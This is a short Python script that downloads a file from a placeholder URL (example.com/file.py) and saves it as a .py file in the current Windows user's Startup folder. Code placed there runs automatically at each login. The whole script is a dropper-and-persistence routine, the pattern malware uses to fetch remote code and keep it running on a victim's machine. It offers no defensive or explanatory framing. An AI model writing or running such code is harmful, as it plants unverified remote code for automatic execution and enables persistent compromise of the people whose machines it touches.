import os
import getpass
import requests

def download_file(url, filename):
    response = requests.get(url)
    with open(filename, 'wb') as f:
        f.write(response.content)

url = 'http://example.com/file.py'  # URL to download the file
username = getpass.getuser()

# Path to the startup folder for the current user
startup_folder = os.path.expanduser(r'~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')

filename = os.path.join(startup_folder, 'downloaded_file.py')  # Filename including path

download_file(url, filename)

